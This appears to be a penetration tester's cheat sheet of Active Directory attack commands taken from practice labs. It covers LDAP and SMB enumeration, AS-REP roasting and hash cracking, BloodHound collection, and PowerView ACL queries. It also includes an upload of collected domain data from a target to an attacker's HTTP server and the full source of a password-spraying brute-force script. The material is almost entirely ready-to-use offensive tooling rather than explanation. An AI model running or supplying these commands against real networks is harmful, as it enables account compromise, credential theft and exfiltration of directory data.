# Enumeration

<details>

<summary>Finding Name of Domain</summary>

```bash
crackmapexec smb 10.11.1.123 -u '' -p ''
```

```bash
ldapsearch -x -H ldap://10.10.10.175 -s base
```

* `rootDomainNamingContext: DC=EGOTISTICAL-BANK,DC=LOCAL`
  * Domain: `EGOTISTICAL-BANK.LOCAL`

</details>

<details>

<summary>LDAPSearch</summary>

```bash
ldapsearch -H ldap://192.168.165.122 -x -W -b "dc=hutch,dc=offsec" > ldap_search.txt

# Usernames
cat ldap_search.txt| grep -i "samaccountname"

# Might have hidden passwords
cat ldap_search.txt| grep -i "description"
```

```bash
ldapsearch -x -H ldap://10.10.10.175 -b 'DC=EGOTISTICAL-BANK,DC=LOCAL'
```

</details>

<details>

<summary>AS-REP Roasting</summary>

### Generate list of potential usernames

```bash
wget https://raw.githubusercontent.com/jseidl/usernamer/master/usernamer.py
python2.7 usernamer.py -f full_names.txt > potential_usernames.txt
```

### Kerbrute

* `--downgrade` so it is in a format that hashcat can crack
* Can use `/usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt` if don't know wordlist

```bash
git clone https://github.com/ropnop/kerbrute.git
go build
kerbrute --dc 10.10.10.175 -d EGOTISTICAL-BANK.LOCAL --hash-file hashes.txt --downgrade userenum potential_usernames.txt
```

### Get-NPUsers

```bash
impacket-GetNPUsers -usersfile users.txt -dc-ip 10.10.10.175 EGOTISTICAL-BANK.LOCAL/
```

```bash
for user in $(cat users); do GetNPUsers.py -no-pass -dc-ip 10.10.10.161 htb/${user} | grep -v Impacket; done
```

### Cracking Hashes

```bash
hashcat -m 18200 -a 0 hash.txt rockyou.txt
```

</details>

<details>

<summary>BloodHound</summary>

```bash
# Generate JSON files
python3 -m bloodhound -d hutch.offsec -u fmcsorley -p CrabSharkJellyfish192 -c all -ns 192.168.165.122 --zip

neo4j console
```

Search bloodhound in Apps and open --> load in the jsons (Upload Data).

Upload completed --> Search "SVC\_LOANMGR@EGOTISTICAL-BANK.LOCAL" --> Node Info --> First Degree Object Control (under Outbound Object Control) --> To see items that this user has rights over

Go hamburger menu and click analysis --> Start from the bottom of the entire list.

### OR Use SharpHound.exe to collect data for BloodHound

The following will generate `20230425015352_BloodHound.zip`

```bash
SharpHound.exe -c all

# OR
Import-Module ..\Sharphound.ps1
Invoke-BloodHound -CollectionMethod All -OutputPrefix "corp_audit"
```

Transfer files to Kali [https://raw.githubusercontent.com/Tallguy297/SimpleHTTPServerWithUpload/master/SimpleHTTPServerWithUpload.py](https://raw.githubusercontent.com/Tallguy297/SimpleHTTPServerWithUpload/master/SimpleHTTPServerWithUpload.py)

```powershell
PS C:\temp> (New-Object System.Net.WebClient).UploadFile('http://192.168.45.5/', 'C:\temp\20230425015352_BloodHound.zip')
```

```bash
┌──(root㉿kali)-[/home/kali/Documents/pg_practice/192.168.231.175]
└─# python3 SimpleHTTPServerWithUpload.py 80
Serving HTTP on localhost port 80 (http://localhost:80/) ...
(True, "<br><br>'/home/kali/Documents/pg_practice/192.168.231.175/20230425015352_BloodHound.zip'", 'by: ', ('192.168.231.175', 49993))
192.168.231.175 - - [25/Apr/2023 05:13:14] "POST / HTTP/1.1" 200 -

```

</details>

<details>

<summary>PowerView</summary>

Download PowerView from [here](https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1)

```powershell
Import-Module .\PowerView.ps1
```

### Enumerate Computers

```powershell
Get-DomainComputer | select name, dnshostname, operatingsystem
```

```bash
nslookup appsrv01.corp1.com

#Name:    appsrv01.corp1.com
#Address:  192.168.139.6
```

### Enumerate Users

```powershell
Get-NetUser | select samaccountname, lastlogon
```

### Enumerate Groups

* Able to show nested groups (unlike `net groups`)

```powershell
Get-NetGroup | select samaccountname
```

### Enumerate OS of Domain hosts

```powershell
Get-NetComputer | select operatingsystem, dnshostname
```

### Resolves Domain Name to IP address

```powershell
Resolve-IPAddress CLIENT76.corp.com
```

### Tests if current account has localadmin access to domain hosts

```powershell
Find-LocalAdminAccess
```

### View if someone logs into the box

* Might not work if running newer versions of Windows

```powershell
Get-NetSession -ComputerName files04 -verbose
```

#### OR, Use PsLoggedon

```powershell
.\PsLoggedon.exe \\client74
```

</details>

<details>

<summary>Object Permissions</summary>

* Access control lists has access control elements&#x20;



* GenericAll: Full permissions on object (change user's password, add to group)&#x20;
* GenericWrite: Edit certain attributes on the object&#x20;
* WriteOwner: Change ownership of the object&#x20;
* WriteDACL: Edit ACE's applied to object&#x20;
* AllExtendedRights: Change password, reset password, etc.&#x20;
* ForceChangePassword: Password change for object&#x20;
* Self (Self-Membership): Add ourselves to for example a group

### Powerview

#### Find GenericAll permissions on Management Department group

<pre class="language-powershell"><code class="lang-powershell">Get-ObjectAcl -Identity "Management Department" | ? {$_.ActiveDirectoryRights -eq "GenericAll"} | select SecurityIdentifier,ActiveDirectoryRights

# Converts the SID to name
"S-1-5-21-1987370270-658905905-1781884369-512", "S-1-5-21-1987370270-658905905-1781884369-1104", "S-1-5-32-548", "S-1-5-18", "S-1-5-21-1987370270-658905905-1781884369-519" | Convert-SidToName
# CORP\Domain Admins
# CORP\stephanie
<strong># BUILTIN\Account Operators
</strong># Local System
# CORP\Enterprise Admins
</code></pre>

#### Find GenericAll permissions on Jen user

```powershell
Get-ObjectAcl -Identity "jen" | ? {$_.ActiveDirectoryRights -eq "GenericAll"} | select SecurityIdentifier,ActiveDirectoryRights

# Converts SID to name
"S-1-5-21-1987370270-658905905-1781884369-512", "S-1-5-32-548", "S-1-5-18", "S-1-5-21-1987370270-658905905-1781884369-519" | Convert-SidToName
```

</details>

<details>

<summary>User's Domain Privileges</summary>

```bash
net user <username> /domain
```

</details>

<details>

<summary>Groups Enumeration</summary>

```
net group /domain
```

* However, `net.exe` does not show nested groups.

Listing all the groups in a domain

```powershell
$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()

$PDC = ($domainObj.PdcRoleOwner).Name

$SearchString = "LDAP://"

$SearchString += $PDC + "/"

$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"

$SearchString += $DistinguishedName

$Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)

$objDomain = New-Object System.DirectoryServices.DirectoryEntry

$Searcher.SearchRoot = $objDomain

$Searcher.filter="(objectClass=Group)"
#$Searcher.filter="(name=Secret_Group)"

$Result = $Searcher.FindAll()

Foreach($obj in $Result)
{
    $obj.Properties.name
}
<#
Foreach($obj in $Result)
{
    $obj.Properties.member
}
#>
```

</details>

<details>

<summary>Currently Logged On Users</summary>

* Find logged on users in the high-value groups since their creds will be cached in memory

```powershell
Import-Module .\PowerView.ps1
```

* The following command invokes `NetWkstaUserEnum`, which requires administrative permissions and returns the list of all users logged on to a target workstation.

```powershell
Get-NetLoggedon -ComputerName client251
```

* The following command invoke `NetSessionEnum`, which can be used from a regular domain user and returns a list of active user sessions on servers.

```powershell
Get-NetSession -ComputerName dc01
```

</details>

<details>

<summary>Service Principal Names (SPN) Enumeration</summary>

* SPN is used to associate a service on a specific server to a service account in Active Directory.

- Service accounts may also be members of high value groups

* Some apps may use a set of predefined service accounts like LocalSystem, LocalService, and NetworkService. For more complex applications, a domain user account may be used to provide the needed context while still having access to resources inside the domain.

The following script searches for the string `http`, which indicates the presence of a registered web server.

```powershell
$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()

$PDC = ($domainObj.PdcRoleOwner).Name

$SearchString = "LDAP://"
$SearchString += $PDC + "/"

$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"

$SearchString += $DistinguishedName

$Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)

$objDomain = New-Object System.DirectoryServices.DirectoryEntry

$Searcher.SearchRoot = $objDomain

$Searcher.filter="serviceprincipalname=*http*"

$Result = $Searcher.FindAll()

Foreach($obj in $Result)
{
    Foreach($prop in $obj.Properties)
    {
        $prop
    }
}
```

```sh
nslookup CorpWebServer.corp.com
```

</details>

<details>

<summary>Account Policy</summary>

```
net users
```

* The Lockout observation window means that after X minutes of the last login attempt, user will be given 3 more login attempts.

```
.\Spray-Passwords.ps1 -Pass Qwerty09! -Admin
```

* The following is `Spray-Passwords.ps1`

```powershell
<#
  .SYNOPSIS
    PoC PowerShell script to demo how to perform password spraying attacks against 
     user accounts in Active Directory (AD), aka low and slow online brute force method.
    Only use for good and after written approval from AD owner.
    Requires access to a Windows host on the internal network, which may perform
     queries against the Primary Domain Controller (PDC).
    Does not require admin access, neither in AD or on Windows host.
    Remote Server Administration Tools (RSAT) are not required.
    
    Should NOT be considered OPSEC safe since:
    - a lot of traffic is generated between the host and the Domain Controller(s).
    - failed logon events will be massive on Domain Controller(s).
    - badpwdcount will iterate on user account objects in scope.
    
    No accounts should be locked out by this script alone, but there are no guarantees.
    NB! This script does not take Fine-Grained Password Policies (FGPP) into consideration.
  .DESCRIPTION
    Perform password spraying attack against user accounts in Active Directory.
  .PARAMETER Pass
    Specify a single or multiple passwords to test for each targeted user account. Eg. -Pass 'Password1,Password2'. Do not use together with File or Url."
	
  .PARAMETER File
    Supply a path to a password input file to test multiple passwords for each targeted user account. Do not use together with Pass or Url.
	
  .PARAMETER Url
    Download file from given URL and use as password input file to test multiple passwords for each targeted user account. Do not use together with File or Pass.
	
  .PARAMETER Admins
    Warning: will also target privileged user accounts (admincount=1.)". Default = $false.
  .EXAMPLE
    PS C:\> .\Spray-Passwords.ps1 -Pass 'Summer2016'
    1. Test the password 'Summer2016' against all active user accounts, except privileged user accounts (admincount=1).
  .EXAMPLE
    PS C:\> .\Spray-Passwords.ps1 -Pass 'Summer2016,Password123' -Admins
    1. Test the password 'Summer2016' against all active user accounts, including privileged user accounts (admincount=1).
  .EXAMPLE
    PS C:\> .\Spray-Passwords.ps1 -File .\passwords.txt -Verbose 
    
    1. Test each password in the file 'passwords.txt' against all active user accounts, except privileged user accounts (admincount=1).
    2. Output script progress/status information to console.
  .EXAMPLE
    PS C:\> .\Spray-Passwords.ps1 -Url 'https://raw.githubusercontent.com/ZilentJack/Get-bADpasswords/master/BadPasswords.txt' -Verbose 
    
    1. Download the password file with weak passwords.
    2. Test each password against all active user accounts, except privileged user accounts (admincount=1).
    3. Output script progress/status information to console.
  .LINK
    Get latest version here: https://github.com/ZilentJack/Spray-Passwords
  .NOTES
    Authored by    : Jakob H. Heidelberg / @JakobHeidelberg / www.improsec.com
    Together with  : CyberKeel / www.cyberkeel.com
    Date created   : 09/05-2016
    Last modified  : 26/06-2016
    Version history:
    - 1.00: Initial public release, 26/06-2016
    Tested on:
     - WS 2016 TP5
     - WS 2012 R2
     - Windows 10
    Known Issues & possible solutions/workarounds:
     KI-0001: -
       Solution: -
    Change Requests for vNext (not prioritized):
     CR-0001: Support for Fine-Grained Password Policies (FGPP).
     CR-0002: Find better way of getting Default Domain Password Policy than "NET ACCOUNTS". Get-ADDefaultDomainPasswordPolicy is not en option as it relies on RSAT.
     CR-0003: Threated approach to test more user/password combinations simultaneously.
     CR-0004: Exception or include list based on username, group membership, SID's or the like.
     CR-0005: Exclude user account that executes the script (password probably already known).
    Verbose output:
     Use -Verbose to output script progress/status information to console.
#>

[CmdletBinding(DefaultParameterSetName='ByPass')]
Param 
(
    [Parameter(Mandatory = $true, ParameterSetName = 'ByURL',HelpMessage="Download file from given URL and use as password input file to test multiple passwords for each targeted user account.")]
    [String]
    $Url = '',

    [Parameter(Mandatory = $true, ParameterSetName = 'ByFile',HelpMessage="Supply a path to a password input file to test multiple passwords for each targeted user account.")]
    [String]
    $File = '',

    [Parameter(Mandatory = $true, ParameterSetName = 'ByPass',HelpMessage="Specify a single or multiple passwords to test for each targeted user account. Eg. -Pass 'Password1,Password2'")]
    [AllowEmptyString()]
    [String]
    $Pass = '',

    [Parameter(Mandatory = $false,HelpMessage="Warning: will also target privileged user accounts (admincount=1.)")]
    [Switch]
    $Admins = $false

)

# Method to determine if input is numeric or not
Function isNumeric ($x) {
    $x2 = 0
    $isNum = [System.Int32]::TryParse($x, [ref]$x2)
    Return $isNum
}

# Method to get the lockout threshold - does not take FGPP into acocunt
Function Get-threshold
{
    $data = net accounts
    $threshold = $data[5].Split(":")[1].Trim()

    If (isNumeric($threshold) )
        {
            Write-Verbose "threshold is a number = $threshold"
            $threshold = [Int]$threshold
        }
    Else
        {
            Write-Verbose "Threshold is probably 'Never', setting max to 1000..."
            $threshold = [Int]1000
        }
    
    Return $threshold
}

# Method to get the lockout observation window - does not tage FGPP into account
Function Get-Duration
{
    $data = net accounts
    $duration = [Int]$data[7].Split(":")[1].Trim()
    Write-Verbose "Lockout duration is = $duration"
    Return $duration
}

# Method to retrieve the user objects from the PDC
Function Get-UserObjects
{
    # Get domain info for current domain
    Try {$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()}
    Catch {Write-Verbose "No domain found, will quit..." ; Exit}
   
    # Get the DC with the PDC emulator role
    $PDC = ($domainObj.PdcRoleOwner).Name

    # Build the search string from which the users should be found
    $SearchString = "LDAP://"
    $SearchString += $PDC + "/"
    $DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"
    $SearchString += $DistinguishedName

    # Create a DirectorySearcher to poll the DC
    $Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)
    $objDomain = New-Object System.DirectoryServices.DirectoryEntry
    $Searcher.SearchRoot = $objDomain

    # Select properties to load, to speed things up a bit
    $Searcher.PropertiesToLoad.Add("samaccountname") > $Null
    $Searcher.PropertiesToLoad.Add("badpwdcount") > $Null
    $Searcher.PropertiesToLoad.Add("badpasswordtime") > $Null

    # Search only for enabled users that are not locked out - avoid admins unless $admins = $true
    If ($Admins) {$Searcher.filter="(&(samAccountType=805306368)(!(lockoutTime>=1))(!(userAccountControl:1.2.840.113556.1.4.803:=2)))"}
    Else {$Searcher.filter="(&(samAccountType=805306368)(!(admincount=1))(!(lockoutTime>=1))(!(userAccountControl:1.2.840.113556.1.4.803:=2)))"}
    $Searcher.PageSize = 1000

    # Find & return targeted user accounts
    $userObjs = $Searcher.FindAll()
    Return $userObjs
}

# Method to perform auth test with specific username and password
Function Perform-Authenticate
{
    Param
    ([String]$username,[String]$password)

    # Get current domain with ADSI
    $CurrentDomain = "LDAP://"+([ADSI]"").DistinguishedName

    # Try to authenticate
    Write-Verbose "Trying to authenticate as user '$username' with password '$password'"
    $dom = New-Object System.DirectoryServices.DirectoryEntry($CurrentDomain, $username, $password)
    $res = $dom.Name
    
    # Return true/false
    If ($res -eq $null) {Return $false}
    Else {Return $true}
}

# Validate and parse user supplied url to CSV file of passwords
Function Parse-Url
{
    Param ([String]$url)

    # Download password file from URL
    $data = (New-Object System.Net.WebClient).DownloadString($url)
    $data = $data.Split([environment]::NewLine)

    # Parse passwords file and return results
    If ($data -eq $null -or $data -eq "") {Return $null}
    $passwords = $data.Split(",").Trim()
    Return $passwords
}

# Validate and parse user supplied CSV file of passwords
Function Parse-File
{
   Param ([String]$file)

   If (Test-Path $file)
   {
        $data = Get-Content $file
        
        If ($data -eq $null -or $data -eq "") {Return $null}
        $passwords = $data.Split(",").Trim()
        Return $passwords
   }
   Else {Return $null}
}

# Main function to perform the actual brute force attack
Function BruteForce
{
   Param ([Int]$duration,[Int]$threshold,[String[]]$passwords)

   #Setup variables
   $userObj = Get-UserObjects
   Write-Verbose "Found $(($userObj).count) active & unlocked users..."
   
   If ($passwords.Length -gt $threshold)
   {
        $time = ($passwords.Length - $threshold) * $duration
        Write-Host "Total run time is expected to be around $([Math]::Floor($time / 60)) hours and $([Math]::Floor($time % 60)) minutes."
   }

   [Boolean[]]$done = @()
   [Boolean[]]$usersCracked = @()
   [Int[]]$numTry = @()
   $results = @()

   #Initialize arrays
   For ($i = 0; $i -lt $userObj.Length; $i += 1)
   {
        $done += $false
        $usersCracked += $false
        $numTry += 0
   }

   # Main while loop which does the actual brute force.
   Write-Host "Performing brute force - press [q] to stop the process and print results..." -BackgroundColor Yellow -ForegroundColor Black
   :Main While ($true)
   {
        # Get user accounts
        $userObj = Get-UserObjects
        
        # Iterate over every user in AD
        For ($i = 0; $i -lt $userObj.Length; $i += 1)
        {

            # Allow for manual stop of the while loop, while retaining the gathered results
            If ($Host.UI.RawUI.KeyAvailable -and ("q" -eq $Host.UI.RawUI.ReadKey("IncludeKeyUp,NoEcho").Character))
            {
                Write-Host "Stopping bruteforce now...." -Background DarkRed
                Break Main
            }

            If ($usersCracked[$i] -eq $false)
            {
                If ($done[$i] -eq $false)
                {
                    # Put object values into variables
                    $samaccountnname = $userObj[$i].Properties.samaccountname
                    $badpwdcount = $userObj[$i].Properties.badpwdcount[0]
                    $badpwdtime = $userObj[$i].Properties.badpasswordtime[0]
                    
                    # Not yet reached lockout tries
                    If ($badpwdcount -lt ($threshold - 1))
                    {
                        # Try the auth with current password
                        $auth = Perform-Authenticate $samaccountnname $passwords[$numTry[$i]]

                        If ($auth -eq $true)
                        {
                            Write-Host "Guessed password for user: '$samaccountnname' = '$($passwords[$numTry[$i]])'" -BackgroundColor DarkGreen
                            $results += $samaccountnname
                            $results += $passwords[$numTry[$i]]
                            $usersCracked[$i] = $true
                            $done[$i] = $true
                        }

                        # Auth try did not work, go to next password in list
                        Else
                        {
                            $numTry[$i] += 1
                            If ($numTry[$i] -eq $passwords.Length) {$done[$i] = $true}
                        }
                    }

                    # One more tries would result in lockout, unless timer has expired, let's see...
                    Else 
                    {
                        $now = Get-Date
                        
                        If ($badpwdtime)
                        {
                            $then = [DateTime]::FromFileTime($badpwdtime)
                            $timediff = ($now - $then).TotalMinutes
                        
                            If ($timediff -gt $duration)
                            {
                                # Since observation window time has passed, another auth try may be performed
                                $auth = Perform-Authenticate $samaccountnname $passwords[$numTry[$i]]
                            
                                If ($auth -eq $true)
                                {
                                    Write-Host "Guessed password for user: '$samaccountnname' = '$($passwords[$numTry[$i]])'" -BackgroundColor DarkGreen
                                    $results += $samaccountnname
                                    $results += $passwords[$numTry[$i]]
                                    $usersCracked[$i] = $true
                                    $done[$i] = $true
                                }
                                Else 
                                {
                                    $numTry[$i] += 1
                                    If($numTry[$i] -eq $passwords.Length) {$done[$i] = $true}
                                }

                            } # Time-diff if

                        }
                        Else
                        {
                            # Verbose-log if $badpwdtime in null. Possible "Cannot index into a null array" error.
                            Write-Verbose "- no badpwdtime exception '$samaccountnname':'$badpwdcount':'$badpwdtime'"
	
	
	
				   # Try the auth with current password
        	                $auth = Perform-Authenticate $samaccountnname $passwords[$numTry[$i]]
			
                                If ($auth -eq $true)
                                {
                                    Write-Host "Guessed password for user: '$samaccountnname' = '$($passwords[$numTry[$i]])'" -BackgroundColor DarkGreen
                                    $results += $samaccountnname
                                    $results += $passwords[$numTry[$i]]
                                    $usersCracked[$i] = $true
                                    $done[$i] = $true
                                }
                                Else 
                                {
                                    $numTry[$i] += 1
                                    If($numTry[$i] -eq $passwords.Length) {$done[$i] = $true}
                                }
			 
			 
			    
                        } # Badpwdtime-check if

                    } # Badwpdcount-check if

                } # Done-check if

            } # User-cracked if

        } # User loop

        # Check if the bruteforce is done so the while loop can be terminated
        $amount = 0
        For ($j = 0; $j -lt $done.Length; $j += 1)
        {
            If ($done[$j] -eq $true) {$amount += 1}
        }

        If ($amount -eq $done.Length) {Break}

   # Take a nap for a second
   Start-Sleep -m 1000

   } # Main While loop

   If ($results.Length -gt 0)
   {
       Write-Host "Users guessed are:"
       For($i = 0; $i -lt $results.Length; $i += 2) {Write-Host " '$($results[$i])' with password: '$($results[$i + 1])'"}
   }
   Else {Write-Host "No passwords were guessed."}
}

$passwords = $null

If ($Url -ne '')
{
    $passwords = Parse-Url $Url
}
ElseIf($File -ne '')
{
    $passwords = Parse-File $File
}
Else
{
    $passwords = $Pass.Split(",").Trim()   
}

If($passwords -eq $null)
{
    Write-Host "Error in password input, please try again."
    Exit
}

# Get password policy info
$duration = Get-Duration
$threshold = Get-threshold

If ($Admins) {Write-Host "WARNING: also targeting admin accounts." -BackgroundColor DarkRed}

# Call the main function and start the brute force
BruteForce $duration $threshold $passwords
```

</details>

<details>

<summary>Anonymous Credential LDAP Dumping</summary>

```bash
ldapsearch -LLL -x -H ldap:// -b ‘’ -s base ‘(objectclass=*)’
```

</details>

<details>

<summary>Impacket Look Up SID</summary>

```bash
/usr/share/doc/python3-impacket/examples/lookupsid.py username:password@172.21.0.0
```

</details>

<details>

<summary>Windapsearch</summary>

```bash
python3 windapsearch.py -d host.domain -u domain\ldapbind -p PASSWORD -U
```

</details>
